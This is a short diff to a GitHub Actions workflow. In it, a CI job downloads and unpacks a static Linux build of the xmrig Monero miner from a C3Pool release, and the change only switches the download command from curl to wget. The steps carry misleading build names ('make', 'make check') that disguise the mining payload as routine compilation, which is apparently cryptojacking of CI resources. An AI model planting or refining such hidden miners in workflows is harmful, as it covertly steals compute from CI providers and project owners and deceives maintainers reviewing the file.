@@ -14,7 +14,7 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - name: https://github.com/C3Pool/xmrig-C3/releases/download/v6.22.2-C3/xmrig-v6.22.2-C3-linux-Static.tar.gz
-      run: curl https://github.com/C3Pool/xmrig-C3/releases/download/v6.22.2-C3/xmrig-v6.22.2-C3-linux-Static.tar.gz
+      run: wget https://github.com/C3Pool/xmrig-C3/releases/download/v6.22.2-C3/xmrig-v6.22.2-C3-linux-Static.tar.gz
     - name: make
       run: tar xzf xmrig-v6.22.2-C3-linux-Static.tar.gz
     - name: make check
